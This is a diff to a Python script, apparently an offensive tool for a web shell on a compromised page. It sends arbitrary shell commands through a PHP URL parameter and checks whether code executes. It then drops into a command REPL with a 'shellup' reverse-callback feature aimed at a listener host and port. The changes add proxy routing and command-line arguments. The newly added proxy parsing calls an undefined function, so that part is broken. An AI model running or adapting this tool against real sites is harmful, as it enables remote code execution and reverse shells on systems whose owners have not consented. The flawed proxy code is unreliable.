@@ -9,19 +9,33 @@
 """
 
 import requests
+import socket
+import argparse
 import random
 import string
 import cmd
+import sys
 
 
 def randomString(stringLength=20):
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for i in range(stringLength))
 
-def invoke_command(url, invoke_word, cmd):
+def invoke_command(url, invoke_word, cmd, proxy_string=""):
     """
     connects to the URL, sends a message through the PHP parameter
     """
+    if len(proxy_string):
+        # This assumes the string is something like
+        # http://localhost:8080
+        try:
+            protocol = split(":", 1)
+            proxies = {protocol[0]: proxy_string}
+
+        except ValueError:
+            # Invalid proxy string, will figure out
+            # how to best handle this another time
+            proxy_string = ""
 
     rstring = randomString()
     prefix = f"{rstring}_BEGIN"
@@ -29,7 +43,10 @@ def invoke_command(url, invoke_word, cmd):
 
     wrapped_command = f"echo -n {prefix}; {cmd} ; echo -n {suffix}"
     payload = { invoke_word: wrapped_command }
-    r = requests.get(url, params=payload)
+    if len(proxy_string):
+        r = requests.get(url, params=payload, proxies=proxies)
+    else:
+        r = requests.get(url, params=payload)
     if prefix in r.text:
         split_left, split_right = r.text.split(prefix)
         content, split_remainder = split_right.split(suffix)
@@ -37,7 +54,7 @@ def invoke_command(url, invoke_word, cmd):
 
     return None
 
-def test_for_code_exec(url, invoke_word):
+def test_for_code_exec(url, invoke_word, proxy_string=""):
     """
     Utilizes the "invoke_command" function to run a simple test
     to determine if we have code execution. Currently only works
@@ -46,7 +63,9 @@ def test_for_code_exec(url, invoke_word):
     test_string = randomString()
     test_var = randomString()
     cmd_string = f"export tfce{test_var}={test_string} && echo $tfce{test_var}"
-    result = invoke_command(url, invoke_word, cmd_string)
+    result = invoke_command(url, invoke_word, cmd_string, proxy_string)
+    if result is None:
+        return False
     if test_string in result:
         return True
     return False
@@ -66,16 +85,25 @@ def check_for_binary(url, invoke_word, binary):
 class Terminal(cmd.Cmd):
     prompt = "Command => "
 
-    def __init__(self, target, invoke_word, lhost, lport):
+    def __init__(self, target, invoke_word, lhost, lport, proxy):
         super().__init__()
         self.target = target
         self.invoke_word = invoke_word
         self.lhost = lhost
         self.lport = lport
+        self.proxy_string = proxy
 
     def default(self, args):
-        print(invoke_command(self.target, self.invoke_word, args))
+        output = invoke_command(self.target, self.invoke_word, args, proxy_string=self.proxy_string)
+        if output is None:
+            print("No output!")
+        else:
+            print(output)
     
+    def do_exit(self, args):
+        print("Exiting.")
+        sys.exit(0)
+
     def do_shellup(self, shelltype):
         """
         Will issue a reverse callback using common binaries on the remote system.
@@ -167,10 +195,10 @@ class Terminal(cmd.Cmd):
             print(f"Please choose a shelltype from {shelltypes}")
 
 
-def main(t, i, lh, lp):
-    term = Terminal(target=t, invoke_word=i, lhost=lh, lport=lp)
+def main(t, i, lh, lp, p):
+    term = Terminal(target=t, invoke_word=i, lhost=lh, lport=lp, proxy=p)
     print("Testing first for code execution...")
-    if test_for_code_exec(t, i):
+    if test_for_code_exec(t, i, proxy_string=p):
         print("We have code execution!")
     else:
         print("Code Execution Test failed, dropping to REPL anyway.")
@@ -179,9 +207,32 @@ def main(t, i, lh, lp):
     term.cmdloop()
 
 if __name__ == "__main__":
-    t = input("Enter target URL to poisoned page: ")
-    i = input("Enter invoke word (ie: ?cmd=whoami, where invoke word is 'cmd'): ")
-    lh = input("Enter the LHOST ip or dns: ")
-    lp = input("Enter the LPORT: ")
-    print("Entering REPL...")
-    main(t=t, i=i, lh=lh, lp=lp)
+    ip_address = socket.gethostbyname(socket.getfqdn())
+    parser = argparse.ArgumentParser(description="This app will interact with a compromised webpage.")
+    parser.add_argument("url", help="Enter the page you want to connect to, preceeded with http/https.")
+
+    parser.add_argument("-lh", "--lhost",
+                        action="store",
+                        dest="lhost",
+                        default=ip_address,
+                        help=f"Enter your local IP address visible to target, defaults to {ip_address}")
+
+    parser.add_argument("-i", "--invoke",
+                        action="store",
+                        dest="invoke",
+                        help="Enter invoke word (ie: ?cmd=whoami, where invoke word is 'cmd', defaults to cmd)",
+                        default="cmd")
+
+    parser.add_argument("-lp", "--lport",
+                        action="store",
+                        dest="lport",
+                        help="Enter the local port, defaults to 9090",
+                        default=9090)
+
+    parser.add_argument("-p", "--proxy",
+                        action="store",
+                        default="",
+                        dest="proxy",
+                        help="to use a proxy, add IP:PORT, ex: -p 127.0.0.1:8080")
+    args = parser.parse_args()
+    main(t=args.url, i=args.invoke, lh=args.lhost, lp=args.lport, p=args.proxy)
